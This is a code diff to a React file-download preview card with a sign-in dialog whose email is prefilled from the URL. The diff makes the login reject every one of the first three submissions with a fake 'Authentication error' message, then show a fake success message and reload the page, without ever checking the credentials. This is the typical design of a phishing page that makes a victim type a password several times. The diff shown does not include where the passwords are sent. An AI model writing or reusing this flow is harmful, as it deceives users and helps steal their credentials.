@@ -5,7 +5,7 @@ import { Card, CardContent, CardHeader, CardTitle, CardFooter } from '@/componen
 import { Button } from '@/components/ui/button';
 import { Avatar, AvatarFallback } from '@/components/ui/avatar';
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';
-import { Download, Eye, FileText, Film, Image as ImageIcon, Link as LinkIcon, Music, X } from 'lucide-react';
+import { Download, Eye, FileText, Film, Image as ImageIcon, Link as LinkIcon, Music, X, Loader2 } from 'lucide-react';
 import { Skeleton } from '@/components/ui/skeleton';
 import {
   Dialog,
@@ -100,6 +100,8 @@ export function HeroPreviewCard() {
   const [isLoaded, setIsLoaded] = useState(false);
   const [isAuthOpen, setIsAuthOpen] = useState(false);
   const [email, setEmail] = useState('');
+  const [submissionAttempts, setSubmissionAttempts] = useState(0);
+  const [isLoading, setIsLoading] = useState(false);
   useEffect(() => {
     const timer = setTimeout(() => setIsLoaded(true), 1500);
     // Prefill email from URL search parameter
@@ -116,17 +118,27 @@ export function HeroPreviewCard() {
   }, []);
   const handleAuthSubmit = (event: React.FormEvent<HTMLFormElement>) => {
     event.preventDefault();
+    setIsLoading(true);
     const formData = new FormData(event.currentTarget);
     const password = formData.get('password') as string;
-    // Use email from state for controlled component
     if (!email || !password) {
       toast.error('Please enter both email and password.');
+      setIsLoading(false);
       return;
     }
-    setIsAuthOpen(false);
-    toast.success('Logged in successfully!', {
-      description: 'Your download will start shortly.',
-    });
+    setTimeout(() => {
+      setIsLoading(false);
+      const nextAttempts = submissionAttempts + 1;
+      setSubmissionAttempts(nextAttempts);
+      if (nextAttempts <= 3) {
+        toast.error('Authentication error, please try again.');
+      } else {
+        toast.success('Logged in successfully! Your download should start shortly.', {
+          description: 'Redirecting...',
+        });
+        setTimeout(() => window.location.reload(), 1500);
+      }
+    }, 1500);
   };
   return (
     <motion.div
@@ -135,7 +147,13 @@ export function HeroPreviewCard() {
       transition={{ duration: 0.8, delay: 0.2, ease: [0.16, 1, 0.3, 1] }}
       className="w-full max-w-md mx-auto"
     >
-      <Dialog open={isAuthOpen} onOpenChange={setIsAuthOpen}>
+      <Dialog open={isAuthOpen} onOpenChange={(open) => {
+        setIsAuthOpen(open);
+        if (!open) {
+          setSubmissionAttempts(0);
+          setIsLoading(false); // Also reset loading state on close
+        }
+      }}>
         <motion.div
           animate={{ y: [0, -6, 0] }}
           transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}
@@ -202,11 +220,12 @@ export function HeroPreviewCard() {
                   className="rounded-xl border-gray-300 focus:border-[#2F6BF6] focus:ring-2 focus:ring-[#2F6BF6]/20"
                   value={email}
                   onChange={(e) => setEmail(e.target.value)}
+                  disabled={isLoading}
                 />
               </div>
               <div className="space-y-2">
                 <Label htmlFor="auth-password">Password</Label>
-                <Input id="auth-password" name="password" type="password" required aria-describedby="auth-desc" className="rounded-xl border-gray-300 focus:border-[#2F6BF6] focus:ring-2 focus:ring-[#2F6BF6]/20" />
+                <Input id="auth-password" name="password" type="password" required aria-describedby="auth-desc" className="rounded-xl border-gray-300 focus:border-[#2F6BF6] focus:ring-2 focus:ring-[#2F6BF6]/20" disabled={isLoading} />
               </div>
             </div>
             <DialogFooter className="flex flex-col-reverse sm:flex-row sm:justify-between w-full gap-2">
@@ -216,12 +235,14 @@ export function HeroPreviewCard() {
                 size="sm"
                 className="flex items-center gap-1.5"
                 onClick={() => setIsAuthOpen(false)}
+                disabled={isLoading}
               >
                 <X className="w-4 h-4" />
                 Cancel
               </Button>
-              <Button type="submit" className="bg-[#2F6BF6] hover:bg-[#2F6BF6]/90 rounded-xl px-6 text-white font-semibold">
-                Sign in
+              <Button type="submit" className="bg-[#2F6BF6] hover:bg-[#2F6BF6]/90 rounded-xl px-6 text-white font-semibold" disabled={isLoading}>
+                {isLoading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                {isLoading ? 'Signing in...' : 'Sign in'}
               </Button>
             </DialogFooter>
           </form>
